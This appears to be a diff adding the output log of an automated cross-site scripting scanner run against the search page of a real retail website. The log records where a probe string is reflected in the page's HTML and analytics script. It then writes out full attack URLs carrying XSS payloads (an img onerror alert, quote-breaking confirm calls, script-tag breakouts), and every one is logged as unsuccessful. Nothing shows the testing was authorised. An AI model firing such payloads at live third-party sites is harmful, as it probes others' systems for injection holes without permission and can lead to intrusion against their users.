@@ -1,0 +1,184 @@
+https://www.kirklands.com/category/Mirrors/All-Mirrors/pc/2450/2306.uts?i=1&q=*&q1=Mirrors&q2=XLarge&store=1&type=nav&x1=primary-cat-name1&x2=size-name&icid=mcMsizeover
+    
+
+GET Params:[3]
+['form_state', 'q', 'defaultSearchKey']
+_______________________________________________________________________________________________________
+https://www.kirklands.com/catalog/search_sp.cmd?form_state="xyz'yxz</zxy&q=*&defaultSearchKey=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+Same Attr : [0]
+
+----------------------------------------------------------------------------------
+Same HTML : [0]
+
+----------------------------------------------------------------------------------
+Same Script : [0]
+
+----------------------------------------------------------------------------------
+Same URI : [0]
+
+
+ENCODING   	  Presence		"		'		<		/ 
+ATTR:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+HTML:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+SCRIPT:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+URL:		False		False	False	False	False
+_______________________________________________________________________________________________________
+https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q="xyz'yxz</zxy&defaultSearchKey=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>Search Results on '"xyz'yxz/zxy' | Kirklands</title>
+<p class="mb-5">Sorry, there are no products that match your search for "xyzyxz/zxy".</p>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script type="text/javascript">
+digitalData = {
+    "pageInstanceID": "search-production",
+    "page": {
+        "pageInfo": {
+            "pageID": "search",
+            "pageName": "Search Results",
+            "destinationURL": window.location.href,
+            "referringURL": document.referrer,
+            "variant": "0",
+            "breadCrumbs":["Home","Search"],
+            "language": "en-US",
+            
+            
+            "onsiteSearchTerm": ""xyz'yxz/zxy",
+            
+            "sortBy": "default",
+            
+            "onsiteSearchResults": 0,
+            
+            "pageType": "Search"
+        },
+        "category": {
+            "primaryCategory": "Search",
+			 "subCategory1": ""
+			 
+        }
+    },
+	
+	
+    "user": [{"profile":[{"address":{"postalCode":"","stateProvince":"","line1":"","country":"","city":"","line2":""},"profileInfo":{"profileID":"","email":"","loggedIn":false},"shippingAddress":[]}]}],
+  
+	
+    "version": "1.0"
+}
+
+try {
+    digitalData.page.pageInfo.referringDomain = new URL(document.referrer).hostname ;
+}
+catch(err) {
+    digitalData.page.pageInfo.referringDomain = "";
+}
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+Same Attr : [0]
+
+----------------------------------------------------------------------------------
+Same HTML : [0]
+
+----------------------------------------------------------------------------------
+Same Script : [0]
+
+----------------------------------------------------------------------------------
+Same URI : [0]
+
+
+ENCODING   	  Presence		"		'		<		/ 
+ATTR:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+HTML:		True		False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q=<img src=x onerror="alert(1)">&defaultSearchKey=
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
+ENCODING   	  Presence		"		'		<		/ 
+SCRIPT:		True		False	False	False	False
+
+Attack Payloads for SCRIPT
+['"; confirm(1); "', "'; confirm(1); '", '</script><script>alert(1)</script>']
+
+SCRIPT Attack Url: https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q="; confirm(1); "&defaultSearchKey=
+
+ ______ UnSuccessful with payload: "; confirm(1); "
+
+
+SCRIPT Attack Url: https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q='; confirm(1); '&defaultSearchKey=
+
+ ______ UnSuccessful with payload: '; confirm(1); '
+
+
+SCRIPT Attack Url: https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q=</script><script>alert(1)</script>&defaultSearchKey=
+
+ ______ UnSuccessful with payload: </script><script>alert(1)</script>
+
+ENCODING   	  Presence		"		'		<		/ 
+URL:		False		False	False	False	False
+_______________________________________________________________________________________________________
+https://www.kirklands.com/catalog/search_sp.cmd?form_state=searchForm&q=*&defaultSearchKey="xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+Same Attr : [0]
+
+----------------------------------------------------------------------------------
+Same HTML : [0]
+
+----------------------------------------------------------------------------------
+Same Script : [0]
+
+----------------------------------------------------------------------------------
+Same URI : [0]
+
+
+ENCODING   	  Presence		"		'		<		/ 
+ATTR:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+HTML:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+SCRIPT:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
+URL:		False		False	False	False	False
